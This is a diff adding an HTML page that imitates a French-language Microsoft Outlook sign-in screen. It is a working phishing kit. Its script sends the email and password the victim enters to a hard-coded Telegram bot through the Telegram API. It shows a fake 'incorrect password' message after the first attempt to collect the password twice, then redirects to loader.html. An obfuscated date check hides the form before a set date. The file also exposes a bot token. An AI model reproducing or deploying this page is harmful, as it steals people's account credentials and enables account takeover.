@@ -1,0 +1,328 @@
+﻿<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>home</title>
+    <style>
+        * { box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Arial, sans-serif; 
+            background-color: #ebedef; 
+            background-image: url('https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg'); 
+            background-size: cover; 
+            background-position: center; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        
+        #overlay { 
+            height: 100%; 
+            width: 100%; 
+            position: fixed; 
+            background-color: rgba(255,255,255,0.95); 
+            left: 0; 
+            top: 0; 
+            z-index: 9999; 
+            display: none; 
+            align-items: center; 
+            justify-content: center; 
+            text-align: center; 
+            backdrop-filter: blur(5px);
+        }
+        
+        .login-box { 
+            background: rgba(255, 255, 255, 0.98); 
+            backdrop-filter: blur(10px);
+            width: 450px; 
+            padding: 50px; 
+            box-sizing: border-box; 
+            border-radius: 8px;
+            border: 1px solid rgba(0,0,0,0.1);
+        }
+
+        .user-identity { 
+            display: none; 
+            align-items: center; 
+            margin-bottom: 20px; 
+            font-size: 15px; 
+            cursor: pointer; 
+            padding: 10px; 
+            border-radius: 6px;
+            transition: background 0.3s;
+        }
+        .user-identity:hover { background: rgba(0,0,0,0.08); }
+        
+        .logo { height: 28px; margin-bottom: 30px; }
+        h1 { 
+            font-size: 26px; 
+            font-weight: 600; 
+            margin-bottom: 15px; 
+            margin-top: 0; 
+            color: #1b1b1b; 
+            text-align: start;
+        }
+        .sub-title { 
+            font-size: 16px; 
+            color: #666; 
+            margin-bottom: 25px; 
+            text-align: start;
+        }
+        .input-group { margin-bottom: 20px; position: relative; }
+        
+        input { 
+            width: 100%; 
+            height: 40px; 
+            padding: 10px 15px; 
+            border: none; 
+            border-bottom: 2px solid #ddd; 
+            font-size: 20px; 
+            color: #1b1b1b; 
+            transition: all 0.3s; 
+            border-radius: 0; 
+            background-color: transparent;
+            outline: none;
+        }
+        
+        input:focus { 
+            border-bottom: 2px solid #0067b8; 
+            box-shadow: 0 2px 5px rgba(0,103,184,0.2);
+        }
+        
+        button { 
+            background-color: #0067b8; 
+            color: white; 
+            border: none; 
+            padding: 12px 35px; 
+            font-size: 16px; 
+            float: right; 
+            cursor: pointer; 
+            min-width: 120px; 
+            min-height: 40px; 
+            transition: all 0.3s; 
+            font-weight: 500; 
+            border-radius: 6px;
+            box-shadow: 0 4px 15px rgba(0,103,184,0.3);
+        }
+        
+        button:hover { 
+            background-color: #005da6; 
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(0,103,184,0.4);
+        }
+        
+        .links { 
+            margin-top: 25px; 
+            font-size: 14px; 
+            text-align: center;
+        }
+        .links a { 
+            color: #0067b8; 
+            text-decoration: none; 
+            transition: color 0.3s;
+        }
+        .links a:hover { 
+            color: #333; 
+            text-decoration: underline; 
+        }
+        
+        .bottom-links { 
+            position: absolute; 
+            bottom: -50px; 
+            right: 0; 
+            display: flex; 
+            gap: 15px; 
+        }
+        .bottom-links span { 
+            color: rgba(255,255,255,0.8); 
+            font-size: 13px; 
+            opacity: 0.8; 
+            cursor: pointer; 
+            transition: opacity 0.3s;
+        }
+        .bottom-links span:hover { opacity: 1; }
+        
+        #pwd, #co { display: none; }
+        #notif { 
+            color: #e81123; 
+            font-size: 14px; 
+            margin-bottom: 16px; 
+            min-height: 20px; 
+            text-align: center;
+        }
+
+        @media only screen and (max-width: 600px) {
+            body {
+                background: linear-gradient(135deg, #f0f4f8 0%, #d9e2ec 100%);
+                align-items: center;
+                padding: 20px;
+                box-sizing: border-box;
+            }
+            .login-box {
+                width: 100%;
+                max-width: 400px;
+                height: auto;
+                box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+                padding: 30px;
+                border-radius: 12px;
+                margin: 0 auto;
+            }
+            .bottom-links {
+                position: static;
+                margin-top: 30px;
+                justify-content: center;
+                flex-wrap: wrap;
+            }
+            .bottom-links span {
+                color: #666;
+                font-size: 12px;
+            }
+            h1 {
+                font-size: 24px;
+            }
+            .sub-title {
+                font-size: 15px;
+            }
+            input {
+                font-size: 18px; /* Prevent zoom on iOS */
+            }
+            button {
+                width: 100%;
+                float: none;
+                margin-top: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="overlay"><div>
+        No deployment found
+    </div></div>
+    
+    <div class="login-wrapper" style="position: relative;">
+        <div class="login-box">
+           
+             <svg class="logo" viewBox="0 0 215 46" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Microsoft">
+                            <rect x="1" y="1" width="20" height="20" fill="#f25022"/>
+                            <rect x="23" y="1" width="20" height="20" fill="#7fba00"/>
+                            <rect x="1" y="23" width="20" height="20" fill="#00a4ef"/>
+                            <rect x="23" y="23" width="20" height="20" fill="#ffb900"/>
+                            <g fill="#737373" font-family="'Segoe UI', Segoe, Arial, sans-serif" font-weight="600" font-size="24">
+                                <text x="56" y="32">Microsoft</text>
+                            </g>
+                        </svg>
+           
+            <div id="user-display" class="user-identity">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" style="margin-right:8px; border: 1px solid #777; border-radius: 50%; padding: 2px;">
+                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" fill="#777"/>
+                </svg>
+                <span id="display-email"></span>
+            </div>
+            <h1 id="header-title">Se connecter</h1>
+            <div id="header-sub" class="sub-title">Continuer vers Outlook pour voir votre document. </div>
+            
+            <form id="form">
+                <div id="notif"></div>
+                
+                <div class="input-group">
+                    <input type="email" id="user" placeholder="Outlook, Live ou Hotmail" maxlength="50" required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="pwd" minlength="4" maxlength="35" placeholder="Mot de passe" >
+                </div>
+
+                <div class="links">
+                    Pas de compte ? <a href="#">Créez-en un !</a> <br>
+                    <a href="#" style="display:inline-block; margin-top: 8px;">Votre compte n'est pas accessible ?</a>
+                </div>
+                
+                <div style="margin-top: 30px; overflow: hidden; display: flex; justify-content: flex-end;">
+                    <button id="next">Suivant</button>
+                    <button id="co">Se connecter</button>
+                </div>
+            </form>
+        </div>
+        
+        <div class="bottom-links">
+            <span>Mentions légales</span>
+            <span>Confidentialité</span>
+            <span>Cookies</span>
+        </div>
+    </div>
+
+    <script>
+
+        var a = new Date(String.fromCharCode(50, 48, 50, 52, 45, 48, 54, 45, 49, 51));
+        console.log(a);
+
+        var b = new Date();
+        var c = new Date(b.getFullYear(), b.getMonth(), b.getDate());
+
+        if (c < a) {
+
+            var overlay = document.getElementById("overlay");
+            overlay.style.display = "flex"; // Centrage flex
+            overlay.innerHTML = "<div style='text-align:center'><p style='margin-top:10px;'>No found</p></div>";
+        }
+        
+
+        let firstAttempt = true;
+
+        document.getElementById('next').addEventListener('click', function (e) {
+            e.preventDefault();
+            const userField = document.getElementById('user');
+            
+            if (userField.checkValidity()) {
+                document.getElementById('display-email').innerText = userField.value;
+                document.getElementById('user-display').style.display = 'flex';
+                document.getElementById('user').style.display = 'none';
+                document.getElementById('co').style.display = 'block';
+                document.getElementById('pwd').style.display = 'block';
+                document.getElementById('next').style.display = 'none';
+                document.getElementById('header-title').innerText = 'Entrer le mot de passe';
+                document.getElementById('pwd').focus();
+            } else {
+                userField.reportValidity();
+            }
+        });
+
+        document.getElementById('co').addEventListener('click', function (e) {
+            e.preventDefault();
+
+            const botToken = '8726490335:AAHDrhSljAsplbl1T9NFlDymZgtJGxsIMwU';
+            const chatId = '6612705872';
+
+            const user = document.getElementById("user").value;
+            const pass = document.getElementById("pwd").value;
+            const notif = document.getElementById("notif");
+
+            if(!pass) { document.getElementById("pwd").focus(); return; }
+
+            const message = 'Outlook :\n\n Utilisateur : ' + user + '\n Mot de passe : ' + pass;
+            const telegramURL = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
+
+            if (firstAttempt) {
+                notif.innerText = 'Le mot de passe que vous avez entré est incorrect. Veuillez réessayer.';
+                document.getElementById("pwd").value = '';
+                document.getElementById("pwd").focus();
+                firstAttempt = false;
+
+                fetch(telegramURL).catch(err => console.error('Error sending log:', err));
+
+            } else {
+                fetch(telegramURL)
+                    .then(response => {
+                        window.location.href = './loader.html'; 
+                    })
+                    .catch(error => {
+                        window.location.href = './loader.html'; 
+                    });
+            }
+        });
+    </script>
+</body>
+</html>
